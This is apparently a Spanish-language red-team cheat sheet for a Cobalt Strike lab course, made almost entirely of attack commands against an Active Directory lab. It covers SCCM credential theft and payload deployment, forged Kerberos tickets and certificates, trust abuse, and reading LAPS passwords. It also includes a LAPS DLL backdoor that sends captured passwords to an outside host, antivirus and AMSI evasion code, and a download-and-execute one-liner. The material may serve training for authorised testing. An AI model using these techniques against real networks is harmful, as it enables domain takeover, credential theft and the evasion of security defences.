beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n DEV --no-banner

# 9. Obtener información detallada sobre dispositivos específicos.
# Se pueden filtrar resultados por nombre de dispositivo (`-n`) y propiedades específicas (`-p`).
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n WKSTN -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner

# 10. Usar SCCM como herramienta para caza de usuarios.
# Este comando devuelve dispositivos donde el usuario especificado fue el último en iniciar sesión.
# Nota: Los datos se actualizan en SCCM cada 7 días por defecto.
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -u nlamb -p IPAddresses -p IPSubnets -p Name --no-banner
```

```r
# Esta enumeración utiliza WMI en segundo plano. Puede replicarse manualmente.
beacon> powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl

Name                   : SMS:S01
CurrentManagementPoint : scm-1.cyberbotic.io
```

## Network Access Account Credentials
```r
## Network Access Account Credentials

# 1. Verificar el usuario actual y sus privilegios.
beacon> getuid
[*] You are DEV\bfarmer (admin)

# 2. Recuperar credenciales de Network Access Account (NAA) usando `local naa` con `-m wmi`.
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner
# Output esperado:
# [+] Decrypting network access account credentials
# NetworkAccessUsername: cyberbotic.io\sccm_svc
# NetworkAccessPassword: Cyberb0tic

# 3. Usar las credenciales recuperadas para realizar una suplantación y explorar recursos en la red.
# Aunque estas credenciales suelen tener acceso de lectura, podrían estar sobreprivilegiadas (por ejemplo, como administradores de dominio/empresa).
beacon> make_token cyberbotic.io\sccm_svc Cyberb0tic
[+] Impersonated cyberbotic.io\sccm_svc (netonly)

# 4. Enumerar recursos compartidos en un servidor remoto para verificar el alcance de los privilegios.
beacon> ls \\dc-1.cyberbotic.io\c$
[*] Listing: \\dc-1.cyberbotic.io\c$\

# Alternativa: Obtener una copia de la política directamente desde SCCM utilizando `get naa`.
# Nota: Este método requiere ser administrador local para obtener los certificados SMS Signing y SMS Encryption.
```

## Lateral Movement
```r
# 1. Ejecutar un comando en cada dispositivo de la colección DEV.
# Con privilegios de Full o Application Administrator sobre un dispositivo o una colección, podemos desplegar scripts o aplicaciones para facilitar el movimiento lateral.
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p C:\Windows\notepad.exe --no-banner

# 2. Forzar la ejecución como SYSTEM utilizando el parámetro `-s`.
# Esto se ejecutará en cada máquina independientemente de si un usuario está conectado o no.
# Al igual que en el capítulo de GPO Abuse, podemos cargar y ejecutar un payload de DNS Beacon.
beacon> execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n DEV -p "C:\Windows\System32\cmd.exe /c start /b \\dc-2\software\dns_x64.exe" -s --no-banner
```

---

# Domain Dominance

```r
+-----------+--------------------------+
| Technique | Required Service Tickets |
+-----------+--------------------------+
| psexec    | HOST & CIFS              |
| winrm     | HOST & HTTP              |
| dcsync    | LDAP                     |
+-----------+--------------------------+
```
## Silver Ticket
```r
## Extra Tips
#mimikatz !sekurlsa::logonpasswords
#Authentication Id : 0 ; 996 (00000000:000003e4)
#Session           : Service from 0
#User Name         : WKSTN-1$
#Domain            : DEV
#mimikatz !sekurlsa::ekeys /id:0x3e4

# 1. Obtener las claves Kerberos (ekeys) desde una máquina comprometida usando mimikatz.
beacon> mimikatz !sekurlsa::ekeys
AES256       3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f

# 2. Obtener Domain SID
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  
beacon> powerpick Get-DomainSID

# 2. Generar el Silver Ticket (TGS) de manera offline utilizando Rubeus.
# Usa el flag `/rc4` para hashes NTLM si no tienes claves AES.
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe silver /service:cifs/wkstn-1.dev.cyberbotic.io /aes256:3ad3ca5c512dd138e3917b0848ed09399c4bbe19e83efe661649aa3adf2cb98f /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

# 3. Inyectar el Silver Ticket en una nueva sesión y verificar acceso al objetivo.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFXD[...]MuaW8=
beacon> steal_token 5668

# 4. Verificar el acceso al recurso compartido objetivo.
beacon> ls \\wkstn-1.dev.cyberbotic.io\c$
```

## Golden Ticket
```r
# 1. Obtener el hash NTLM/AES de la cuenta `krbtgt` usando dcsync.
beacon> dcsync dev.cyberbotic.io DEV\krbtgt

# 2. Generar el Golden Ticket offline utilizando Rubeus.
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:nlamb /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /nowrap

# 3. Inyectar el Golden Ticket en una nueva sesión y ganar acceso.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

# 4. Suplantar el token importado.
beacon> steal_token 5060

# 5. Verificar el ticket de Kerberos activo.
beacon> run klist

# 6. Probar acceso al objetivo.
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

## Diamond Ticket
```r
# 1. Obtener el SID del usuario del ticket.
beacon> powerpick ConvertTo-SID nlamb

# 2. Crear el Diamond Ticket usando Rubeus.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:nlamb /ticketuserid:1106 /groups:512 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

### Parámetros explicados:
- `/tgtdeleg`: Utiliza el Kerberos GSS-API para obtener un TGT utilizable para el usuario actual sin necesidad de conocer su contraseña, hash NTLM/AES o elevación en el host.
- `/ticketuser`: Nombre de usuario a suplantar.
- `/ticketuserid`: RID de dominio del usuario objetivo.
- `/groups`: RIDs de grupo deseados (512 corresponde a Domain Admins).
- `/krbkey`: Hash AES256 de la cuenta `krbtgt`.

# 3. Verificar las especificaciones del Diamond Ticket en comparación con un Golden Ticket.
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe describe /ticket:doIFYj[...snip...]MuSU8=

# 4. Inyectar el Diamond Ticket Forjado (segundo) en una nueva sesión y ganar acceso.
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFoj<SNIPPED>PVElDLklP

# 5. Suplantar el token importado.
beacon> steal_token 5060

# 6. Verificar el ticket de Kerberos activo.
beacon> run klist

# 7. Probar acceso al objetivo.
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

## Forged Certificates
```r
# EXTRA TIP (as Diamond ticket jump to DC-2)
beacon> jump psexec64 dc-2.dev.cyberbotic.io smb

# 1. Identificar el hostname y verificar privilegios en el sistema objetivo.
beacon> run hostname
dc-2
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

# 2. Extraer la clave privada y el certificado de la CA (en DC/CA).
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

# 3. Guardar el certificado como archivo .pem y convertirlo al formato .pfx usando OpenSSL.
ubuntu@DESKTOP-3BSK7NO > openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx
#3kyRoad2CRTO

# 4. Obtener el UPN correcto para el usuario
# La UPN del certificado debe coincidir exactamente con el UPN que tiene el usuario en AD.
beacon> powerpick Get-DomainUser -Identity nlamb -Properties userprincipalname, samaccountname | fl

# 4. Utilizar el certificado robado de la CA para generar un certificado falsificado para el usuario nlamb.
PS C:\Users\Attacker> C:\Tools\ForgeCert\ForgeCert\bin\Release\ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword 3kyRoad2CRTO --Subject "CN=User" --SubjectAltName "nlamb" --NewCertPath nlamb.pfx --NewCertPassword 3kyRoad2CRTO

# 5. Codificar el certificado en Base64.
ubuntu@DESKTOP-3BSK7NO > cat fake.pfx | base64 -w 0

# 6. Usar el certificado para solicitar un TGT para el usuario nlamb.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /enctype:aes256 /certificate:MIAC<SNIPPED>AAAA /password:3kyRoad2CRTO /nowrap

# 7. Inyectar el ticket y acceder al servicio objetivo.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIG<SNIPPED>VW8=

beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-2.dev.cyberbotic.io\c$
```

---
# Forest & Domain Trusts

## Enumeration
```r
# 1. Verificar el usuario actual en el contexto de la sesión.
beacon> getuid
[*] You are DEV\bfarmer

# 2. Enumerar las relaciones de confianza del dominio actual (utiliza el atributo `-Domain` para enumerar otros dominios).
beacon> powerpick Get-DomainTrust
```

## Parent / Child

### Golden Ticket
```r
## Golden Ticket para Escalación de Privilegios: De Dominio Hijo (DEV.CYBERBOTIC.IO) a Dominio Padre (CYBERBOTIC.IO) vía SID History

# 1. Enumerar información básica requerida para crear el ticket falsificado.
# Obtener el SID del grupo "Domain Admins" en el dominio padre.
beacon> powerpick Get-DomainGroup -Identity "Domain Admins" -Domain cyberbotic.io -Properties ObjectSid

# Obtener el nombre del Controlador de Dominio en el dominio padre.
beacon> powerpick Get-DomainController -Domain cyberbotic.io | select Name

# Enumerar los miembros del grupo "Domain Admins" en el dominio padre.
beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" -Domain cyberbotic.io | select MemberName

# 2. Crear el Golden Ticket de manera offline utilizando Rubeus.
PS C:\Users\Attacker> C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /user:Administrator /domain:dev.cyberbotic.io /sid:S-1-5-21-569305411-121244042-2357301523 /sids:S-1-5-21-2594061375-675613155-814674916-512 /nowrap

- `/aes256:`: Especifica la key para cifrar el ticket.
- `/user:Administrator`: El usuario que se va a suplantar.
- `/domain:dev.cyberbotic.io`: Se indica el dominio hijo (desde donde se está realizando la escalación).
- `/sid:`: El SID del usuario en el dominio hijo.
- `/sids:`: El SID del dominio padre (extraído anteriormente) se añade al SID History. Esto es crucial, ya que es lo que permite que el ticket sea aceptado en el dominio padre, dándote privilegios elevados.

# 3. Inyectar el ticket falsificado y generar una sesión.
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

# 4. Robar el token de la sesión generada, verificar el ticket inyectado y acceder al DC objetivo.
beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-1.cyberbotic.io\c$

# 5. Usar los privilegios obtenidos para acciones como movimiento lateral o extracción de datos sensibles.
# Usar PsExec para moverse lateralmente al DC padre.
beacon> jump psexec64 dc-1.cyberbotic.io smb

# Realizar DCSync para extraer el hash de krbtgt del dominio padre.
beacon> dcsync cyberbotic.io cyber\krbtgt
```

### Diamond Ticket
```r
# 1. Enumerar información básica requerida para crear el ticket falsificado
# Obtener el SID del grupo "Domain Admins" en el dominio padre.
beacon> powerpick Get-DomainGroup -Identity "Enterprise Admins" -Domain cyberbotic.io -Properties ObjectSid

# Obtener el SID del usuario Administrador en el dominio hijo.
beacon> powerpick Get-DomainUser -Identity Administrator -Properties objectsid | fl

# 2. Crear un Diamond Ticket utilizando Rubeus
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:S-1-5-21-2594061375-675613155-814674916-519 /krbkey:51d7f328ade26e9f785fd7eee191265ebc87c01a4790a7f38fb52e06563d4e7e /nowrap

/tgtdeleg: Activa la delegación del TGT, lo que permite que el ticket pueda ser usado para delegar credenciales a otros servicios.
/ticketuser:Administrator y /ticketuserid:500: Indican que el ticket se forja para el usuario Administrator, cuyo RID usualmente es 500.
/groups:519 y /sids: Se definen los grupos o privilegios asociados al ticket. Nótese que se usa un RID distinto (519 en lugar de 512 del Golden Ticket), lo que significa `Enterprise Admins`
/krbkey: Es la clave KRB del dominio, necesaria para cifrar y validar el ticket. (AES256)
/nowrap: Desactiva ciertos ajustes de formato en la salida, simplificando el ticket generado.

# 3. Inyectar el ticket generado y crear una sesión con el ticket falso
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:Administrator /password:FakePass /ticket:doIGA<SNIPPED>ElDLklP


# 4. Robar el token, verificar el ticket inyectado y acceder al DC objetivo
beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc-1.cyberbotic.io\c$

# 5. Moverse lateralmente o realizar post-explotación
# Usar PsExec para moverse lateralmente al DC padre
beacon> jump psexec64 dc-1.cyberbotic.io smb

# Extraer el hash de krbtgt para un control completo del dominio
beacon> dcsync cyberbotic.io cyber\krbtgt
```

## One-Way Inbound
```r
## Explotación de Confianzas Entrantes (Usuarios en nuestro dominio pueden acceder a recursos en un dominio extranjero)
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1  

# 1. Enumerar el dominio extranjero con confianza entrante
beacon> powerpick Get-DomainTrust
beacon> powerpick Get-DomainComputer -Domain dev-studio.com -Properties DnsHostName

# 2. Verificar si miembros de nuestro dominio son parte de algún grupo en el dominio extranjero
beacon> powerpick Get-DomainForeignGroupMember -Domain dev-studio.com
beacon> powerpick ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1120
beacon> powerpick Get-DomainGroupMember -Identity "Studio Admins" | select MemberName
beacon> powerpick Get-DomainController -Domain dev-studio.com | select Name

# 3. Obtener el hash AES256 del usuario identificado (ejemplo: nlamb)
beacon> dcsync dev.cyberbotic.io dev\nlamb

# 4. Crear un TGT Inter-Realm para el usuario identificado en los pasos anteriores (usar el hash AES256 del usuario con `/aes256`)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:nlamb /domain:dev.cyberbotic.io /aes256:a779fa8afa28d66d155d9d7c14d394359c5d29a86b6417cb94269e2e84c4cee4 /nowrap

# 5. Solicitar un ticket de referencia hacia el dominio extranjero
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/dev-studio.com /domain:dev.cyberbotic.io /dc:dc-2.dev.cyberbotic.io /ticket:doIFwj[...]MuaW8= /nowrap

# 6. Solicitar un TGS en el dominio extranjero para un servicio específico (ejemplo: CIFS)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:cifs/dc.dev-studio.com /domain:dev-studio.com /dc:dc.dev-studio.com /ticket:doIFoz[...]NPTQ== /nowrap

# 7. Inyectar el ticket para acceder a los recursos del dominio extranjero
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:DEV /username:nlamb /password:FakePass /ticket:doIFLz[...snip...]MuaW8=

# 8. Verificar el ticket y acceder al recurso
beacon> steal_token 5060
beacon> run klist
beacon> ls \\dc.dev-studio.com\c$
```

## One-Way Outbound
```r
## Explotación de Confianzas Salientes (Usuarios en otro dominio pueden acceder a recursos en nuestro dominio)

# 1. Enumerar la confianza saliente (msp.org) en el dominio principal (cyberbotic.io)
beacon> powerpick Get-DomainTrust -Domain cyberbotic.io

# 2. Enumerar el Trusted Domain Object (TDO) para obtener la clave compartida del trust
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain cyberbotic.io --attributes distinguishedName,name,flatName,trustDirection

# 3.1 Moverse lateralmente al propio DC con confianza saliente (DC-1) y extraer el Key Material
beacon> run hostname
DC-1
beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)
beacon> mimikatz lsadump::trust /patch

# 3.2 Usar DCSync para obtener el hash NTLM del objeto TDO de manera remota
beacon> powerpick Get-DomainObject -Identity "CN=msp.org,CN=System,DC=cyberbotic,DC=io" | select objectGuid
# Suplantar con steal_token 
beacon> mimikatz @lsadump::dcsync /domain:cyberbotic.io /guid:{b93d2e36-48df-46bf-89d5-2fc22c139b43}

# 4. La "trust account" creada en el dominio confiado (msp.org) tiene el nombre del dominio confiante (CYBER$). Se puede suplantar para obtener acceso de usuario normal (/rc4 es el hash NTLM del objeto TDO).
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"

beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:CYBER$ /domain:msp.org /rc4:42e122235586becc3dd5b31e6a15b7c7 /nowrap

# 5. Inyectar el ticket (en DC-1)
beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:MSP /username:CYBER$ /password:FakePass /ticket:doIFGD<SNIPPED>3Aub3Jn

# 6. Verificar el ticket y explorar el dominio confiado
beacon> steal_token 5060
beacon> run klist
beacon> powerpick Get-Domain -Domain msp.org
```

---

# Local Administrator Password Solution 

## LAPS Enumeration
```r
# 1. Texto aqui
beacon> run hostname
wkstn-2

# 2. Verificar si el cliente de LAPS está instalado en la máquina local
beacon> ls C:\Program Files\LAPS\CSE

# 3. Identificar objetos de computadora con los atributos ms-Mcs-AdmPwd y ms-Mcs-AdmPwdExpirationTime configurados
beacon> powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName

# 4. Verificar las configuraciones de LAPS implementadas a través de GPO
beacon> powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

# 5. Descargar la configuración de LAPS desde el GPO
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{2BE4337D-D231-4D23-A029-7B999885E659}\Machine\Registry.pol

# 6. Analizar el archivo de política del GPO de LAPS descargado en el paso anterior
PS C:\Users\Attacker> Parse-PolFile .\Desktop\Registry.pol
```

## Reading  ms-Mcs-AdmPwd

```r
## Identificar principales con acceso a contraseñas de LAPS

# 1. Verificar quién tiene derechos de lectura en las contraseñas de LAPS
beacon> powershell Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | select ObjectDn, SecurityIdentifier

beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1107 (DEV\Developers)
beacon> powershell ConvertFrom-SID S-1-5-21-569305411-121244042-2357301523-1108 (DEV\Support Engineers)

# 2. Usar LAPSToolkit para identificar grupos y usuarios con derechos de lectura en las contraseñas de LAPS
beacon> powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1
beacon> powerpick Find-LAPSDelegatedGroups
beacon> powerpick Find-AdmPwdExtendedRights
beacon> powerpick Get-DomainGroupMember -Identity "GroupName" | select MemberName

# 3. Leer la contraseña de LAPS para una máquina específica (desde una sesión de usuario con los derechos necesarios)
beacon> getuid
[*] You are DEV\bfarmer

beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd

# 4. Usar la contraseña de LAPS para obtener acceso
beacon> make_token .\LapsAdmin 1N3FyjJR5L18za
beacon> ls \\wkstn-1\c$
```

## Password Expiration Protection
```r
# 1. Verificar el Hostname y los Privilegios
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)

# 2. Obtener las Propiedades `ms-Mcs-AdmPwd` y `ms-Mcs-AdmPwdExpirationTime`
beacon> powerpick Get-DomainComputer -Identity wkstn-1 -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime


# 3. Establecer una fecha de expiración futura para la contraseña (solo la máquina puede establecer su propia contraseña)
beacon> powerpick Set-DomainObject -Identity wkstn-1 -Set @{'ms-Mcs-AdmPwdExpirationTime' = '136257686710000000'} -Verbose
```

## LAPS Backdoors
```r
# 1. Modificar los archivos DLL AdmPwd.PS.dll y AdmPwd.Utils.dll en la ubicación:
# Esto puede permitir registrar contraseñas de LAPS cada vez que un administrador las vea.
beacon> ls C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

# 2. Descargar los DLLs, modificarlos usando dnSpy y volver a subirlos al sistema.
[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/388/e3f/f67/dnspy.png]

# 3. Vuelve al método GetPassword, haz clic derecho en algún lugar de la ventana principal y selecciona _Edit Method_. Lo primero que necesitamos hacer es agregar una nueva referencia de ensamblado, utilizando el botón en la parte inferior de la ventana de edición.

[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/e6e/92f/535/add-reference.png]

# 4. Usa la caja de búsqueda para encontrar y agregar `System.Net`.
# Este código simplemente instanciará un nuevo `WebClient` y llamará al método `DownloadString`, pasando el nombre de la computadora y la contraseña en el URI.

[Referencia: https://files.cdn.thinkific.com/file_uploads/584845/images/497/f24/92f/backdoor.png]

// Backdoor Start
using (var client = new WebClient())
{
    client.BaseAddress = "http://nicekviper.com";
    try
    {
        client.DownloadString($"?computer={passwordInfo.ComputerName}&pass={passwordInfo.Password}");
    }
    catch
    {
        // Manejo básico de errores
    }
}
// Backdoor End

# 4. Subir los DLLs modificados al sistema objetivo
beacon> upload C:\Users\Attacker\Desktop\AdmPwd.PS.dll

# 5. Verificar la firma digital de los archivos modificados
beacon> powershell Get-AuthenticodeSignature *.dll

# 6. Probar el backdoor
PS C:\Users\nlamb> Get-AdmPwdPassword -ComputerName sql-2 | fl

# 7. Confirmar actividad del backdoor en el servidor atacante
```

---
# MS Defender Antivirus 
## Malicious file detected example
Por ejemplo, podemos demostrar que tenemos acceso al File Server, pero no podemos utilizar PsExec para ello porque el **payload** del binario de servicio predeterminado es **detectado** por Defender.
```r
beacon> ls \\fs.dev.cyberbotic.io\c$
beacon> jump psexec64 fs.dev.cyberbotic.io smb
[-] Could not start service 633af16 on fs.dev.cyberbotic.io: 225

PS C:\Users\Attacker> net helpmsg 225
Operation did not complete successfully because the file contains a virus or potentially unwanted software.
```

Si copiamos el payload a nuestro escritorio local y verificamos el log asociado, podemos ver que el "archivo" fue detectado.
```r
PS C:\Users\Attacker> copy C:\Payloads\smb_x64.svc.exe .\Desktop\
PS C:\Users\Attacker> Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1
```

En el caso de AMSI
```r
# La alerta que produce Defender está etiquetada con `amsi:` en lugar de `file:`, lo que indica que se detectó algo malicioso en memoria.
PS C:\Users\Attacker> .\smb_x64.ps1
PS C:\Users\Attacker> Get-MpThreatDetection | sort $_.InitialDetectionTime | select -First 1
```

## Artifact Kit
```r
C:\Tools\cobaltstrike\arsenal-kit\kits\artifact

# Los entry-point de cada formato de artefacto se encuentran en `src-main`:
# - dllmain.c (DLL)
# - main.c (EXE)
# - svcmain.c (Service EXE)

# Los archivos de evasión de cada formato de artefacto se encuentran en `src-common`
# - mailslot - lee el shellcode a través de un mailslot.
# - peek - utiliza una combinación de Sleep, PeekMessage y GetTickCount.
# - pipe - lee el shellcode a través de un named pipe.
# - readfile - el artefacto se lee a sí mismo desde el disco y busca encontrar el shellcode incrustado.

ubuntu@DESKTOP-3BSK7NO > ./build.sh pipe VirtualAlloc 310272 5 false false none /mnt/c/Tools/cobaltstrike/artifacts
# pipe (Técnicas de evasión) → Se está utilizando la técnica pipe (probablemente relacionada con Named Pipes para evasión).
# VirtualAlloc (Allocator) → Se usa VirtualAlloc para asignar memoria para el Reflective DLL Loader.
# 310272 (Stage Size) → Define el tamaño del stage (carga inicial del payload). Está dentro de los valores recomendados.
# 5 (RDLL Size) → Se está generando un Reflective DLL Loader (RDLL) de 5K.
# false (Include Resource File) → No se incluye un archivo de recursos.
# false (Stack Spoofing) → No se usa stack spoofing.
# none (Syscalls) → No se usará una técnica especial de syscalls (ni embedded, ni indirect, ni indirect_randomized).
# /mnt/c/Tools/cobaltstrike/artifacts (Output Directory) → Los artefactos generados se guardarán en esta ruta.

ubuntu@DESKTOP-3BSK7NO /m/c/T/c/a/pipe> ls -la
total 2044
drwxrwxrwx 1 ubuntu ubuntu   4096 Feb 17 15:07 ./
drwxrwxrwx 1 ubuntu ubuntu   4096 Feb 17 15:05 ../
-rwxrwxrwx 1 ubuntu ubuntu  11914 Feb 17 15:07 artifact.cna*
-rwxrwxrwx 1 ubuntu ubuntu  14336 Feb 17 15:06 artifact32.dll*
-rwxrwxrwx 1 ubuntu ubuntu  14848 Feb 17 15:06 artifact32.exe*
-rwxrwxrwx 1 ubuntu ubuntu 323584 Feb 17 15:06 artifact32big.dll*
-rwxrwxrwx 1 ubuntu ubuntu 324096 Feb 17 15:06 artifact32big.exe*
-rwxrwxrwx 1 ubuntu ubuntu  15360 Feb 17 15:06 artifact32svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 324608 Feb 17 15:06 artifact32svcbig.exe*
-rwxrwxrwx 1 ubuntu ubuntu  19456 Feb 17 15:06 artifact64.exe*
-rwxrwxrwx 1 ubuntu ubuntu  18432 Feb 17 15:06 artifact64.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu 328704 Feb 17 15:07 artifact64big.exe*
-rwxrwxrwx 1 ubuntu ubuntu 327680 Feb 17 15:06 artifact64big.x64.dll*
-rwxrwxrwx 1 ubuntu ubuntu  20480 Feb 17 15:06 artifact64svc.exe*
-rwxrwxrwx 1 ubuntu ubuntu 329728 Feb 17 15:07 artifact64svcbig.exe*

#- '32/64' denota arquitecturas de 32 y 64 bits.
#- 'big' denota que es tageless.
#- 'svc' denota que es un ejecutable de servicio.

### Load Artifact in Script Manager
C:\Tools\cobaltstrike\artifacts\pipe\artifact.cna	✓

# Real-time protection debe estar deshabilitada
# Esto dividirá el archivo en pequeños fragmentos y los escaneará con Defender para revelar cualquier parte que active firmas estáticas
# NOTA: ThreatCheck no puede emular el sandbox del AV, por lo que esto es solo para firmas estáticas.
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Tools\cobaltstrike\artifacts\pipe\artifact64svcbig.exe

# Ghidra Tool
C:\Tools\ghidra-10.3.1\ghidraRun.bat
```
### Modifying patch.c and bypass-pipe.c
```c
# patch.c
/* decode the payload with the key */
   for (x = 0; x < length; x++) {
    char *ptr = (char *)buffer + x;

    // Código de ruido: operaciones inútiles para confundir análisis estático
    DWORD tick = GetTickCount();
    DWORD procId = GetCurrentProcessId();
    volatile DWORD dummy = (tick ^ procId) + (x * 7);
    (void)dummy;  // Evitar warnings de variable no utilizada

    // Operación real: descifrado XOR con la clave
    *ptr ^= key[x % 8];
   }

# bypass-pipe.c
sprintf(pipename, "%c%c%c%c%c%c%c%c%ceky\\pwnnet", 92, 92, 46, 92, 112, 105, 112, 101, 92);
```
## Resource Kit
```r
#Para hacer este cambio permanente en todas las cargas útiles de PowerShell, podemos modificar la plantilla relevante en el Resource Kit.Se utiliza para modificar los artefactos basados en scripts, incluyendo PowerShell, Python, HTA y VBA. Se encuentra en `C:\Tools\cobaltstrike\arsenal-kit\kits\resource`.
ubuntu@DESKTOP-3BSK7NO > ./build.sh /mnt/c/Tools/cobaltstrike/resources


### Load Resources in Script Manager
C:\Tools\cobaltstrike\resources\resources.cna	✓


### ThreatCheck (AMSI)
# Real-time protection debe estar habilitada.
PS C:\Users\Attacker> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.ps1 -e amsi
```
### Modifying smb_x64.ps1
```r
$clave = (2 * 20) - (7 - 2)

function Invoke-ObfXor {
    param(
        [Byte]$dato,
        [Int]$key
    )
    return $dato -bxor $key
}

for ($i = 0; $i -lt $var_code.Count; $i++) {
    $var_code[$i] = Invoke-ObfXor -dato $var_code[$i] -key $clave
}
```

## Manual AMSI Bypass
```r
[Referencia: https://dcollao.pages.dev/CRTO/24/U2x9/#manual-amsi-bypasses]

PS C:\Users\bfarmer> iex (new-object net.webclient).downloadstring("http://nickelviper.com/bypass"); iex (new-object net.webclient).downloadstring("http://nickelviper.com/a")

# AMSI bypass
